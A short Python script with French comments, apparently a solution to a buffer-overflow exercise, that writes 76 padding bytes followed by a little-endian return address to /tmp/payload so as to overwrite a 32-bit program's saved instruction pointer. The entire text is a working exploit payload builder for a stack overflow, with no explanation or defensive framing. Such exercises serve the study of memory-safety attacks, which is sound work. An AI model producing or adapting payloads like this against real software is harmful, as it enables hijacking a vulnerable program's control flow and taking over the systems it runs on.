import struct

adresse = 0x8048444
adresse_little_endian = struct.pack("<I", adresse)  # "<I" = little-endian, 4 octets
print(struct.pack("<I", 0x8048444))

# Construction de la payload
buffer = b"A" * 76
eip = adresse_little_endian 

payload = buffer + eip

with open("/tmp/payload", "wb") as f:
    f.write(payload)